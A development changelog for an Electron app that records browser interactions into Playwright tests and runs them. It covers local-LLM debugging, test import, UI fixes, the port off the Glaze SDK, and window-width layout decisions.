- **Key decisions:** Generation is explicit (no auto-start) so the user can edit options and re-generate; the dialog stays mounted (controlled by `open`) so the response survives open/close. Viewport is a prompt hint only — the runner doesn't apply it at runtime (no config plumbing added, keeping the change surgical); speed IS persisted on the record since that field already exists and the runner honors it. Reuses `extractCorrectedScript` (the same `import`+`test(` heuristic as Debug with AI's Apply) to gate the "Create test" button.
- **UI elements:** dialog, field/input/textarea/segmented-control/select, code-block cards, generate + create-test buttons, toast. **Backend elements:** new `tests:createFromPrompt` IPC handler.

### 2026-07-30 — Debug with AI: formatted code output + one-click Apply to script

- **Goal:** Format the local-LLM debug response so suggested code changes are easy to spot, and — if feasible — auto-apply the suggested changes to the script being debugged.
- **What was done:** New `renderer/lib/parse-llm-response.ts` (`parseResponse` tokenizes prose + fenced code, tolerant of a still-streaming trailing fence; `extractCorrectedScript` returns the largest closed code block containing `import` and `test(`). Updated `llm-prompts.ts` system prompt: allow fenced ```ts blocks, ask for a short prose diagnosis then the COMPLETE corrected spec as one code block (so it's applyable); when the spec was head-truncated in the prompt, ask for changed lines only (no partial full-file). `ai-debug-panel.tsx` now renders parsed segments — prose `<p>` + `CodeBlock` cards (language label + per-block copy) — and shows an "Apply to script" button (AlertDialog confirm) once streaming finishes and a full corrected spec is detected; it calls a new `onApplyScript` prop. `test-detail-view.tsx` supplies `onApplyScript` → `tests:updateScript` + query invalidation.
- **Key decisions:** Full-file replacement (reusing the existing `tests:updateScript` flow) over diff/hunk application — far more reliable with small local models. Guarded apply behind an `import`+`test(` heuristic and a truncation check so a snippet or partial file is never written; confirm dialog because it overwrites the current script.
- **UI elements:** dialog, code-block cards, apply button + confirm alert, toast. **Backend elements:** none new — reuses `tests:updateScript` IPC.
- **Verification:** `BuildApp` green (lint + type-check + build). Live inspection session unavailable again (`sessionUnavailable`, cross-app bootstrap timeout) — same pre-existing host-side issue noted in prior entries, unrelated to this change.
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Debug with AI: grounded prompt engineering (persona, locator rules, dynamic context)

- **Goal:** User pasted generic third-party advice on layered LLM context (system prompt persona, dynamic context injection, few-shot examples, RAG for scope) and asked to adapt it to this app's real shape, plan first, then execute on approval.
- **What was done:** Reviewed the actual "Debug with AI" prompt (`ai-debug-panel.tsx`) and the real spec conventions (`script-generator.ts`). Extracted a new `renderer/lib/llm-prompts.ts` (`buildDebugMessages`) so the prompt isn't inline in the dialog component: a stronger system-prompt persona (expert QA engineer) with hard rules matching what this app's specs actually emit (locator preference order, no `waitForTimeout`, web-first assertions) plus one bad/good locator example, and an explicit output-format rule (plain text, no markdown — the response renders in a `<pre>`, not markdown). Added two dynamic context fields to the user message: `imported` (from `test.sourceDir`, since imported scripts are hand-authored and the locator conventions may not hold) and `speed` (from `TestRecord.speed`, mapped through a local mirror of `playwright-runner.ts`'s `SLOW_MO_MS` to note whether an artificial delay is already in play — informs whether timing/race causes are more or less likely). `ai-debug-panel.tsx` and `test-detail-view.tsx` updated to pass the two new fields through.
- **Key decisions:** Deliberately dropped from the generic advice: live-page DOM/interactive-element extraction (no live page exists once a run has finished — the recorder already captures structured locators at record time, so this only matters for the deferred step-generation phase), Page Object Model file references (this app only produces flat single-file specs, no POM concept), and vector DB/RAG (each debug session is one script + one run's output, well inside a local model's context window — no scale problem to solve).
- **UI elements:** none new — same dialog, richer prompt content. **Backend elements:** none — pure renderer-side prompt construction, no new IPC.
- **Verification:** `BuildApp` green (lint + type-check + build). Live inspection session was unavailable again (`sessionUnavailable`, cross-app session bootstrap timeout) — consistent with the phase-2 entry below; a plain-text prompt change has no visually distinct runtime signal to check via DOM snapshot anyway, so this wasn't blocking.
- **Corrections/Lessons Learned:** None from the user this turn — plan was approved as proposed.

### 2026-07-30 — Local LLM integration, phase 2 (Debug with AI for failing runs)

- **Goal:** Consume the phase-1 `llm:chat` streaming API to let users debug a failing test run with the local LLM, per the approved phase-2 plan.
- **What was done:** New `renderer/lib/use-llm-chat.ts` (`useLlmChat()` hook: starts a chat, subscribes to `llm:chunk/done/error` filtered by the request's own `requestId` via a ref so stale events from a prior request are ignored). New `renderer/main/ai-debug-panel.tsx` (`AiDebugDialog`): builds a system+user prompt from the test name/url/script (head-truncated 6000 chars) + failing run output (tail-truncated 8000 chars — errors are usually at the end), auto-sends when opened, streams the response into a `Dialog size="xl"` with Stop/Regenerate/Copy-response controls; backend error messages ("No model selected.", unreachable server) get an appended "Open Settings (⌘,)" hint. `run-output.tsx` gained a `Sparkles`-icon "Debug with AI" button (next to Copy output) shown only when the run failed (`code !== null && code !== 0`); `test-detail-view.tsx` owns the dialog's open state and supplies test/script context that `RunOutput` itself doesn't have.
- **Key decisions:** Dialog auto-starts on open rather than requiring an extra click, since the button that opens it already signals intent to debug. No markdown rendering — response shown as plain preformatted text (matches the existing Script/Output panel style). Dialog uses props-mode with no `onConfirm` (dismiss via Esc/outside-click only), since this is a read-only streaming view, not a form.
- **UI elements:** dialog (streaming response, status badge, action buttons), toolbar-style icon button. **Backend elements:** none new — reuses phase 1's `llm:chat`/`llm:cancel` IPC and push events.
- **Verification:** `BuildApp` green (lint + type-check + build). Could NOT live-verify in the running app — the Glaze host hit a pre-existing `ERR_MODULE_NOT_FOUND` on `@glaze/core/backend`'s internal chunk files after the build-triggered WebView reload, so the cross-app inspection session never became ready (`AppStatus`/`LaunchApp` both timed out on "cross-app session bootstrap"). This is a host/SDK-side module resolution error unrelated to this app's source; if it recurs on a future task, check the app logs for `ERR_MODULE_NOT_FOUND ... chunk-*.js imported from @glaze/core/backend.js` before assuming a code regression.
- **Corrections/Lessons Learned:** None from the user this turn; this was an unattended continuation of the approved plan (Auto Mode).

### 2026-07-30 — Local LLM integration, phase 1 (backend foundation + Settings connection UI)

- **Goal:** Add local LLM support (Ollama and/or LM Studio) to later power test-run-output debugging and in-trainer step generation. This phase = backend foundation only, per the approved plan.
- **What was done:** New `main/services/llm/types.ts`, `llm-config-store.ts` (persists to `userData/recorder/llm-config.json`), and `llm-service.ts` (provider-agnostic: `status`/`detect`/`listModels` + streaming `chat` over the OpenAI-compatible `/v1/chat/completions`, SSE-parsed, `AbortController` cancel, pushes `llm:chunk/done/error`). Registered `llm:*` IPC handlers (with `unknown`+type-guard validation for provider/messages). Added `api.llm.*` renderer wrappers + `renderer/lib/llm-types.ts` mirror. Added an "AI provider" section to `renderer/settings/settings-view.tsx` (provider radio, Test connection button showing an Online/Offline `Status` + model list, default-model radio). Bumped the settings window to 560×480.
- **Key decisions:** One OpenAI-compatible client for both providers; loopback URLs to dodge the macOS local-network prompt; chat pushes via `sendToMain` (main window) since phase-2 consumers live there; `sourceDir`-style backend network needs no capability declaration. Deferred (phase 2+): the actual debug-run-output and generate-steps UIs that consume `llm:chat`.
- **UI elements:** settings panel (radio groups, button, status badge). **Backend elements:** service, json config store (local_storage), ipc_handler, streaming push.
- **Verification:** BuildApp green (lint + type-check + build). Confirmed the built bundles are live (backend `main/index.js` contains `llm:status` + `127.0.0.1:11434`; settings bundle contains "Local AI provider"). Verified `Status` (variant `success`/`error`) and `Button` (variant `muted`) prop APIs against the SDK `.d.ts` before building. Could NOT live-exercise the Settings panel: it opens only via the native app menu (Cmd+,), which live inspection can't drive, and there's no in-app trigger; a real connection test also needs a running Ollama/LM Studio (absent here) — the offline path is deterministic and returns gracefully.
- **Corrections/Lessons Learned:** `LiveAppEvaluate` runs in an isolated world where `window.glazeAPI` is undefined, so IPC can't be invoked from it, and the settings window can't be opened programmatically that way. `Status` variants are `success/error/warning/loading/neutral` (NOT "danger"); `Button` has no "secondary" variant (used `muted`).

### 2026-07-30 — Detail view: created tests show Steps+Script, imported tests show Script only

- **Goal:** Previous mutually-exclusive tab logic (Steps when `steps.length>0`, else Script) was a regression: created-in-app tests should show **both** Steps AND Script; imported tests should show **only** Script (the verbatim file is the source of truth, not the lossy parsed steps).
- **What was done:** In `renderer/main/test-detail-view.tsx`, replaced the mutually-exclusive `TabsTrigger` with: `imported = Boolean(test.sourceDir)`; `showSteps = !imported && steps.length>0`. Imported → only the Script tab renders. Created → both Steps and Script tabs render (Steps active when it has steps, else Script active). The Steps `TabsContent` only renders for created tests; the Script `TabsContent` always renders. `sourceDir` is the "imported" signal (created tests never set it); `scriptEdited` alone is NOT used because a user can also set it by manually editing a created test's script.
- **Verification:** In the running app — created test "Nav Test" (7 steps) shows both `Steps (7)` (active) + `Script` tabs; imported test "Homepage loads correctly" (`sourceDir:true`, steps=0) shows only `Script`. (Sidebar item navigation via synthetic `.click()` doesn't trigger TanStack Router's onClick — focus the button + dispatch `keydown`/`keyup` Enter instead.)
- **Key decisions:** `sourceDir` (not `scriptEdited`) distinguishes imported from created, since manual script edits set `scriptEdited` on a created test too.

### 2026-07-30 — Sidebar: "Remove from Sidebar" context menu item (hide, no file deletion)

- **Goal:** The user wanted to right-click an imported test and remove it from the sidebar view — but WITHOUT any file-system action (never delete the spec file).
- **What was done:** Added `TestRecord.hidden?: boolean` (backend + renderer mirror). `testStore.list()` now filters out `hidden` records (the sidebar uses `list`), while `testStore.get()` still returns them (detail page still works if navigated to). New `testStore.setHidden(id, hidden)` writes the flag + `updatedAt` (no file touched). New `tests:setHidden {id,hidden}` IPC handler + `api.tests.setHidden`. In `library-sidebar.tsx`, added a "Remove from Sidebar" `CustomContextMenuItem` (EyeOff icon) between "Reveal in Finder" and the "Adjust Test Speed" submenu — above the speed setting as requested. On select: calls `setHidden(id,true)`, invalidates `["tests"]`, navigates to `/` if the hidden test was currently open, toasts "Removed from sidebar."
- **Verification:** Right-clicked "Homepage loads correctly" in the running app → context menu shows "Reveal in Finder / Remove from Sidebar / Adjust Test Speed" in that order. Clicked the item → test disappeared from sidebar, "Removed from sidebar." toast appeared. Confirmed on disk: `tests.json` still has the record with `hidden: true`, and the `<id>.spec.ts` file still exists — no file deleted. Restored `hidden: false` afterward and reloaded to bring the test back.
- **Key decisions:** Hide (not delete) is the right semantic for "I don't want to see it anymore" + "never delete a file". The record + script stay on disk for later restoration. No unhide UI was added (the user only asked for removal); a hidden test can be unhidden by editing `tests.json` or by a future "show hidden" affordance.

### 2026-07-30 — Run output panel: opaque background

- **Goal:** The run "Output" panel was transparent — the script/code text behind it showed through.
- **What was done:** Added `bg-background` to the `RunOutput` root `div` in `renderer/main/run-output.tsx` so the panel is always opaque.
- **Verification:** Confirmed the built bundle includes `bg-background flex h-56 shrink-0 flex-col border-t border-separator`.

### 2026-07-30 — Import: copy sibling modules so imported specs actually run

- **Goal:** Running an imported test failed with `Cannot find module './fixtures.js'` — imported specs reference sibling files (`./fixtures.js`, `./helpers.js`) that the import only copied the spec, not its siblings.
- **What was done:** `import-service.ts` now `copyRelativeImports()` each spec's `./`/`../` siblings (recursively, ext + index probing, 5MB cap) into the scripts dir at import time, and stores `sourceDir` (the spec's original folder) on the `TestRecord`. New `tests:repairImports {id}` handler (`importService.repairImports`) re-copies from `sourceDir` for legacy/reset records. Added `TestRecord.sourceDir?: string` (backend + renderer mirror).
- **Backfill:** The 4 pre-existing imported records had no `sourceDir` and missing siblings; copied `fixtures.js`/`helpers.js` from the still-present source folder (`/Users/chris/Ritual/ritual-e2e-tests/tests`) into the scripts dir and set `sourceDir` on those records in `tests.json` directly.
- **Verification:** Re-ran "Ritual Shopping Flow" — the `Cannot find module` error is gone; the spec now loads and Playwright runs it. The remaining failure is a bug in the user's own spec (`createStepLogger(testInfo, 'Checkout')` is missing the required 3rd `totalSteps` arg that every other spec in that folder passes) — not an app defect, so left untouched.
- **Key decisions:** Copy siblings at import time (while the source/git checkout is on disk) rather than trying to resolve them at run time (source may be gone, esp. for git imports). `repairImports` throws a friendly error when `sourceDir` is absent rather than guessing.

### 2026-07-30 — Import: parse spec files into Steps so the Steps view is primary

- **Goal:** When a folder of tests is imported, analyze each file, interpret/translate its test steps, and populate them — show the Script view only when Steps aren't available; attempt steps in all cases.
- **What was done:** New `main/services/spec-parser.ts` (`parseSpec(source) → Step[]`) — the reverse of `script-generator.ts`. String-aware comment stripping (so `//` in a URL isn't a line comment), arrow-aware `test(...)` body extraction (skips `test.skip`/`describe`/hooks; finds the body via `=>` then first balanced `{}`), then a forward scan recognizing `page.goto`, `page.keyboard.press`, `expect(<locator>).toBeVisible/.toContainText`, and `<locator>.click/.fill/.selectOption/.check/.uncheck/.press` with `getByTestId/getByRole/getByLabel/getByPlaceholder/getByText/locator(...)` locators (role+name parsed from `getByRole("role", { name: "x" })`). `import-service.ts` now calls `parseSpec` to populate `steps` (keeps `scriptEdited: true` so the verbatim file stays the runnable artifact and rename never regenerates over the lossy parsed steps). `test-detail-view.tsx` tabs are now mutually exclusive: `Steps (n)` when `steps.length > 0`, else `Script` (the `TabsRoot defaultValue` picks accordingly); the unused tab trigger is not rendered.
- **Key decisions:** `scriptEdited` stays true even when steps parse — the imported file is the source of truth for running; steps are display-only. Parser is best-effort: files that wrap actions in helpers (`gotoWithRetry`, `createStepLogger`, etc.) yield 0 steps and correctly fall back to Script-only. `parseLocator` must receive the statement slice from `i` (incl. `await page.getByRole(...)`), NOT the args-only slice from the open paren — its regex anchors on the builder name.
- **UI elements:** `test-detail-view.tsx` mutually-exclusive Steps/Script tab trigger.
- **Backend elements:** `spec-parser.ts` (new), `import-service.ts` `importFound` step population.
- **Corrections/Lessons Learned:** Three parser bugs caught by running it against the real persisted spec files (not just the synthetic sample): (1) `stripComments` was string-blind so `"https://..."` lost everything after `//` — made it string-aware; (2) `extractTestBodies` grabbed the arrow's `({ page })` destructuring brace as the body — find `=>` first, then the first `{`; (3) `parseLocator` was passed the args slice starting at `(` (no `getByRole` text) so it returned null for every locator-action — pass the slice from `i`. Also a JSDoc comment containing the literal `*/` closed the comment early and broke the build — avoid `/* */` in JSDoc text. Verified the mutually-exclusive tabs live: Nav Test (steps=7) shows only `Steps (7)`; Starter Sets (steps=0) shows only `Script`.
- **User Frustrations & Important Remarks:** None.

### 2026-07-25 — Right-click context menu: Reveal in Finder + Adjust Test Speed slider

- **Goal:** Right-clicking a test in the sidebar should show "Reveal in Finder" and an "Adjust Test Speed" submenu (Slow/Medium/Fast, slider preferred over discrete options) that actually changes run speed.
- **What was done:** Added `TestRecord.speed?: "slow"|"medium"|"fast"` (backend + renderer mirror types), `tests:setSpeed {id,speed}` IPC handler, and `api.tests.setSpeed`. Wrapped each `SidebarListItem` in a `CustomContextMenu` with "Reveal in Finder" (`window.glazeAPI.shell.showItemInFolder`, newly wired in `preload.ts`) and a `CustomContextMenuSub` "Adjust Test Speed" containing `TestSpeedSlider` — a 3-stop (`min=0 max=2 step=1 ticks=3`) filled `Slider` labeled Slow/Fast. `playwright-runner.ts` now writes a one-time `playwright.config.ts` (`ensureConfig`) mapping `PW_SLOWMO_MS` → `launchOptions.slowMo`, and `start()` passes `SLOW_MO_MS[rec.speed ?? "fast"]` (0/400/1200ms) through that env var.
- **Key decisions:** Used `CustomContextMenu` (not native `ContextMenu`) for the whole row menu since native NSMenu can't embed a `Slider`; kept Reveal in Finder in the same custom menu for one consistent implementation rather than mixing native + custom. Playwright's test CLI has no `--slow-mo` flag, so a generated config file + env var was the only way to plumb per-test speed into `launchOptions.slowMo`.
- **UI elements:** Sidebar row `CustomContextMenu`/`CustomContextMenuSub`, `TestSpeedSlider` (filled `Slider` with start/end labels + live "Speed: X" text).
- **Backend elements:** `tests:setSpeed` ipc_handler, `test-store.ts` `save()` reuse, `playwright-runner.ts` config generation + env wiring.
- **Corrections/Lessons Learned:** See the `Slider onValueCommit` note above — the slider's local value updated on click but persistence silently never happened because `onValueCommit` doesn't fire for a plain click; switched to committing on `onValueChange`. Diagnosed by grepping the app log for the exact string `testStore.save()` logs (`"Saved test record"`), not the IPC channel name — an earlier grep for `setSpeed|error` came back empty and was misleading before this was realized.
- **User Frustrations & Important Remarks:** None — bug was caught via the app's own live-verification (right-click → adjust slider → close/reopen menu → value reverted) before ever reporting the feature done.

### 2026-07-24 — Import existing Playwright tests (local folder or git URL)

- **Goal:** Let the user import a git repo of Playwright tests from the local file system or a git URL, with the sidebar + offering "Select from files", "From URL", and "Create New".
- **What was done:** New `main/services/import-service.ts` (native folder picker scan + `git clone --depth 1` shallow clone of a URL to a temp dir, both scanning for `*.spec.ts`/`*.test.ts` and creating one `TestRecord` per file — file content is the script, `steps: []`, `scriptEdited: true`, name/url parsed from `test("…")`/`page.goto("…")`). Added `tests:importFiles` / `tests:importGit` IPC handlers and typed `api.tests.importFiles/importGit`. New `import-git-dialog.tsx`. Sidebar + now opens a native `Menu.popup` with the three options.
- **Key decisions:** One `TestRecord` per spec file (preserves the file verbatim; runs as-is through the existing runner). Imported tests are `scriptEdited: true` so rename/trainer logic never regenerates over them. Backend opens the folder picker (`dialog.showOpenDialog`) so import is one atomic IPC call.
- **UI elements:** Sidebar + native popup menu, `ImportGitDialog` (URL field + inline error), success/error toasts, navigate-to-first-imported.
- **Backend elements:** `import-service.ts` (dialog, `execFile` git clone, fs dir walk), two IPC handlers, `testStore` reuse.
- **Corrections/Lessons Learned:** First tried a React `DropdownMenu`, then `CustomDropdownMenu`, in the Sidebar `actions` slot — BOTH rendered an empty actions wrapper with no trigger button and no thrown error. Root cause: `Sidebar` runs `applyButtonDefaults` over `actions`, which breaks `*DropdownMenuTrigger asChild`. Only a plain `<Button>` renders there. Fixed by opening a native `window.glazeAPI.Menu.popup` from the plain button's onClick. Verified via DOM (button present) + app log (`MenuPopup: showing popup with 4 items` at the button's anchor point). Native menu items are not in the WebView DOM/screenshot, so the popup itself can't be DOM-inspected.
- **User Frustrations & Important Remarks:** None. Native menu selection → dialog/import flow can't be automated past the native boundary, but wiring is verified end to end up to it.

### 2026-07-24 — Edit existing tests via the trainer + in-app script editing

- **Goal:** Let the user reopen the trainer on an existing test to extend its recorded steps, and let them directly edit the generated Playwright script text from within the app.
- **What was done:** `recorder:start` now accepts an optional `testId`; when given, `recorder-service.start()` seeds the session (`url`/`name`/`existingSteps`/`createdAt`) from the stored `TestRecord`, replays existing steps to the renderer, skips the synthetic initial `goto` step, and marks `session.editing = true` (surfaced in `RecorderState.editing`, shown in `RecordingView` as "Editing recording"/"Editing" status). Stopping regenerates the script from the combined steps, keeps the original `createdAt`, and resets `scriptEdited: false`. Added "Edit in Trainer" toolbar button on `test-detail-view.tsx`, guarded by an `AlertDialog` warning when `test.scriptEdited` is true (continuing discards manual script edits). Added `tests:updateScript {id, source}` IPC handler that writes the spec file directly and sets `TestRecord.scriptEdited = true`; `tests:rename` now skips script regeneration when `scriptEdited` is set. Script tab in `test-detail-view.tsx` got an Edit/Save/Cancel flow using a raw `<textarea>` (not the design-system `Textarea`, which caps height) plus an "Edited manually" badge.
- **Key decisions:** Reuse the same `TestRecord` id/`createdAt` when editing rather than creating a new test, so the detail view/history stay pointed at one record. Regenerating from steps always wins over a manual script edit (with an explicit warning) rather than trying to merge — simpler and predictable.
- **UI elements:** "Edit in Trainer" toolbar button + `AlertDialog` confirmation, Script tab Edit/Save/Cancel controls, "Edited manually" badge, `RecordingView` editing-mode title/status.
- **Backend elements:** `recorder:start {testId}` seeding logic, `tests:updateScript` IPC handler, `scriptEdited`-aware `tests:rename`.
- **Corrections/Lessons Learned:** Live-testing the new flow surfaced a pre-existing bug unrelated to this feature: a same-origin redirect on initial load (e.g. bare domain → trailing slash) re-triggers the `will-navigate` interceptor, which re-issues its own `loadURL` and interrupts the original `await recWindow.loadURL(url)` in `start()`, throwing "Navigation was interrupted by a new loadURL() call." and aborting `start()` before `broadcastState()` ran — so the UI never left the empty state despite the trainer window opening. Fixed by swallowing that specific interruption (`.catch(() => {})`) since the redirect's own `loadNavInWindow` call still lands the window on the right page. Diagnosed via the app log file (Bash `tail` on the Logs directory), not DOM inspection, since the failure was a rejected backend promise with no DOM symptom.
- **User Frustrations & Important Remarks:** None — self-diagnosed and verified via live inspection (`LiveAppSnapshotDOM`/`LiveAppClick`) and direct inspection of the persisted `tests.json`/`.spec.ts` files before reporting completion.

### 2026-07-24 — Inline-editable test name in the detail toolbar

- **What was done:** `test-detail-view.tsx` heading (`ToolbarTitle` showing `test.name`) is now clickable — click swaps it for a controlled `Input` (Enter/blur saves via `tests:rename`, Escape cancels). Extracted the shared `saveName()` helper, reused by both the inline edit and the existing pencil-icon → Dialog rename flow.
- **UI elements:** Test detail toolbar heading (`h2`, `cursor-text`), inline `Input` swap.

### 2026-07-24 — Fix (real cause): cross-origin links opening the system browser

- **Goal:** Clicking a normal site link during recording still opened the URL in an external Chrome window (the previous `target`-rewrite fix didn't cover it).
- **What was done:** Added a `will-navigate` interceptor in `recorder-service.ts` that `preventDefault()`s main-frame, non-same-document http(s) navigations and re-loads them in the recorder window via `loadURL` (with a `selfLoad` re-entrancy guard). Kept the `target`-rewrite and `setWindowOpenHandler` layers; added a `did-create-window` close backstop.
- **Key decisions:** Force in-window navigation at the `will-navigate` layer (the real path) instead of only rewriting `target`. Intercept all cross-document main-frame navs uniformly for predictability (trade-off: cross-origin form POSTs become GET reloads — acceptable for recorded flows).
- **UI elements:** None (recorder navigation behavior).
- **Backend elements:** webContents `will-navigate`/`did-create-window` handling, `loadURL`.
- **Corrections/Lessons Learned:** The earlier diagnosis was wrong — the failing links had NO `target` (plain cross-origin `<a href>`), so target-rewrite did nothing. Root cause: Glaze routes cross-origin main-frame navigations to the system browser unless `will-navigate` is prevented. Also: an external browser window never shows in `LiveAppInspectionStatus`, so "window count stayed at 2" was a false-positive check; verified the real fix by reading the recorder window's `location.href` (now `anthropic.com` in-window after clicking a cross-origin HN link).
- **User Frustrations & Important Remarks:** User reported this twice; the first fix looked validated but wasn't (bad verification method). Confirmed fixed on a real cross-origin link this time.

### 2026-07-24 — Keep new-window links inside the trainer window

- **Goal:** Interacting with `target="_blank"` links/buttons during recording was opening a new tab in an external browser window instead of navigating within the recorder window.
- **What was done:** Added `keepInWindow()` to the injected capture script — during the capture-phase click and keydown it rewrites the clicked anchor/form `target` to `_self` before the browser follows it; also injects `<base target="_self">` on each page. Kept `setWindowOpenHandler` (deny + in-window `loadURL`) as the backstop for `window.open`.
- **Key decisions:** Fix in-page (target rewrite) rather than relying on the native window-open handler, since WKWebView routes `_blank` anchor clicks out before that handler fires.
- **UI elements:** None (recorder capture behavior only).
- **Backend elements:** capture-script injection.
- **Corrections/Lessons Learned:** `setWindowOpenHandler` alone does not catch `target="_blank"` anchor navigations in WKWebView. Verified in the running app: after clicking a `_blank` link the anchor's `target` became `_self` and no new window opened (window count stayed at 2).
- **User Frustrations & Important Remarks:** User hit this immediately when recording — new tabs opening in another Chrome window broke the recording flow.

### 2026-07-24 — Initial build: website interaction recorder → Playwright

- **Goal:** Prompt for a URL, record interactions in a browser window, generate a Playwright script on close, and run it locally from the app.
- **What was done:** Built the full recorder (capture script + DOM-attribute queue + poll drain), live recording UI with pause/resume and assertion modes, test library + detail (Steps/Script tabs), script generator, and a self-contained Playwright runner that installs the browser on first run and streams output.
- **Key decisions:** Self-contained runner bundling `@playwright/test`; capture interactions + assertions; generate `@playwright/test` spec files. Chose DOM-attribute capture after discovering Glaze `executeJavaScript` is ephemeral-world and `console-message` doesn't reach the backend.
- **UI elements:** SplitView sidebar (test library), New Recording dialog, live Recording view (Status, Pause/Resume, assert SegmentedControl, live step list), detail view (Tabs: Steps/Script), streamed Run output panel.
- **Backend elements:** recording BrowserWindow management, executeJavaScript injection + poll-drain, local_storage (JSON + spec files), child_process (Playwright CLI), ipc_handlers, backend→renderer event push.
- **Corrections/Lessons Learned:** `executeJavaScript` ephemeral-world + no backend `console-message` forced the DOM-attribute approach. Runner initially failed with "Cannot find module '@playwright/test'" because the built backend runs from `.glaze/build`; fixed by scanning candidate node_modules roots. `LiveAppEvaluate` runs in an isolated world where `window.glazeAPI` is undefined — drive the UI via clicks + native input-setter, not by calling `invoke` from evaluate.
- **User Frustrations & Important Remarks:** None yet. First run of a test downloads ~80–150MB of browser; subsequent runs are fast.

---

## 2026-08-07 — Ported off the Glaze SDK onto stock Electron

**Goal:** remove every Glaze dependency, simplify the build, and produce a
distributable app. Full detail in [../PORTING.md](../PORTING.md); this entry
records the decisions.

- **Electron over Tauri.** The SDK mirrored Electron's API, so the backend port
  was 15 symbols across 32 files, nearly all 1:1. Tauri would have meant
  rewriting every Node service (runner, import, LLM, all stores) in Rust or
  behind a sidecar — a rewrite, not a port. Cost: ~386 MB unpacked vs a few MB.

- **One seam, lint-enforced.** App code imports `@shell/backend`, never
  `electron`. Without the rule the adapter stops being a seam — the
  `windowKey` strip, the logger and the navigation types get bypassed one
  import at a time, and the backend stops being stubbable, which is what makes
  it testable at all. Rejected: letting each file import Electron directly.

- **`app://` scheme, not `file://`.** Vite emits `<script type="module"
  crossorigin>`; from `file://` that has a null origin and is blocked by CORS.
  The window opens, renders nothing, and the main process log is completely
  clean — it cost real time to diagnose, which is also why renderer console
  errors are now forwarded to the main log. Rejected: `webSecurity: false` —
  unacceptable in a process that loads arbitrary untrusted sites.

- **Select and DropdownMenu stayed native.** Electron's `Menu.popup` takes the
  same plain-data template the SDK's did, so these keep rendering items to
  `null` and driving a real macOS menu. That preserved the native behaviour AND
  the existing tests, which stub `glazeAPI.Menu.popup`. Converting them to
  Radix DOM menus would have invalidated those tests and put a DOM menu inside
  a 560×480 settings window. The documented caveat is unchanged: options are
  not in the DOM, so assert the displayed value.

- **The date picker did change**, to a DOM `<input type="date">` — Electron has
  no equivalent of `dialog.showDatePicker`. It is now keyboard-accessible and
  testable, which the native one was not. One call site (`stats-view.tsx`).

- **Rebuilt the design system rather than vendoring it.** 73 symbols on
  `radix-ui` + `cva` + `tailwind-merge` — the SDK's own peer dependencies, all
  already direct dependencies here. Same symbol names and prop contracts, so
  the 36 consuming views only changed their import specifier. Vendoring
  `@glaze/core` was rejected on licensing: it ships no LICENSE file and carries
  Raycast copyright.

- **App Store ruled out, Developer ID chosen.** `playwright install` downloads
  and executes browser binaries at runtime — App Review 2.5.2 prohibits it
  outright, and the App Sandbox separately blocks spawning executables signed
  by someone else. A MAS build would mean shipping the recorder without the
  runner. Developer ID + notarization has neither constraint.

- **Corrections / lessons learned:** esbuild's ESM output needs a
  `createRequire` banner or bundled CJS deps (pngjs) die on `Dynamic require of
  "util"`; the banner must define only `require`, since adding
  `__filename`/`__dirname` collides with `main/index.ts` and is a SyntaxError.
  `asar` must stay off or the Playwright spawn gets a path that isn't real.
  Spawns need `ELECTRON_RUN_AS_NODE=1` or `process.execPath` relaunches the app.
  Electron types `webContents.on` as literal-keyed overloads, so iterating a
  union of event names needs a cast at the dispatch.

- **Not verified:** no end-to-end recording session was driven against a live
  site in the ported build, and the packaged app's UI was not visually
  inspected (only the dev build was). Visual fidelity of the rebuilt component
  library against the original is an approximation, not a pixel match.

## 2026-08-09 — The narrow-window contract: measured floor, content-aware rows

`minWindowWidth` was 390. The widest toolbar (test detail) needs 688px of
content pane beside a 240px sidebar, so from roughly 928px down the run
controls left the viewport — `Run test` on test detail, `Run 0` on batch — and
nothing could bring them back: `document.scrollWidth` equalled the viewport and
no ancestor carried `overflow-x: auto`. The app was permitting a window size its
own primary actions fell out of. Batch additionally rendered two test names at
`width: 0` — not ellipsised, absent.

- **Both halves were needed, and they fail in opposite directions.** Raising the
  floor alone leaves the collapsing grids intact, so the next layout change
  reintroduces the failure *above* the floor where the window size is no longer
  protecting anything. Fixing the grids alone leaves a 390px minimum that no
  toolbar can honour. The floor bounds how far the squeeze can go; the grids
  decide whether the squeeze degrades or destroys.

- **`grid-cols-2` was the mechanism, not the symptom.** Tailwind's shorthand is
  `repeat(2, minmax(0, 1fr))`. That `0` is a real floor of zero: a column may
  shrink below the width of its own text. Because the run-option labels are
  `overflow: visible`, they neither clip nor ellipsise when it happens — they
  paint across the neighbouring column. At 860px the columns were 48px holding
  text that needed 96px, which read on screen as the four options printed on top
  of one another. Same shape in batch's rows, where every cell but the name is
  `shrink-0`, so the name absorbed the entire squeeze and `min-w-0` let it reach
  zero.

- **`max-content` was tried first and is wrong.** It does floor the columns at
  their content, but it also forbids wrapping, which pushed test detail's
  toolbar minimum to 1085px — wider than this window's 1000px *default*. That
  trades a rare overlap for a guaranteed one. `auto` resolves to
  `minmax(min-content, max-content)`: the floor becomes the longest unbreakable
  word, so labels still wrap to two lines when tight — which was always fine to
  read — and simply cannot be squeezed narrower than a word. That is what took
  the requirement from 1085 back to 928.

- **The floor is measured, not chosen.** 960 is the 928px requirement plus
  slack, taken from the browser preview against the real stylesheet rather than
  picked as a round number. `check:narrow-layout` pins the requirement as a
  constant, so a future toolbar that needs more room fails the check rather than
  silently overflowing the window.

- **Guarded at source level**, like `check:scroll-layout` and for the same
  reason: jsdom has no layout engine, so no rendered test in this repo can
  observe a column collapsing or a control leaving the viewport. The check pins
  the floor, the default-vs-floor ordering, and both grid shapes; all five
  substantive assertions were verified to fail against the pre-fix code.

- **One existing test changed meaning.** `test-detail-view.test.tsx` asserted the
  literal `grid-cols-2` class. Its intent — all four toggles in one two-column
  block — still holds and is kept; the class assertion now requires explicit
  tracks and explicitly rejects `grid-cols-2`, because that shorthand is the bug.
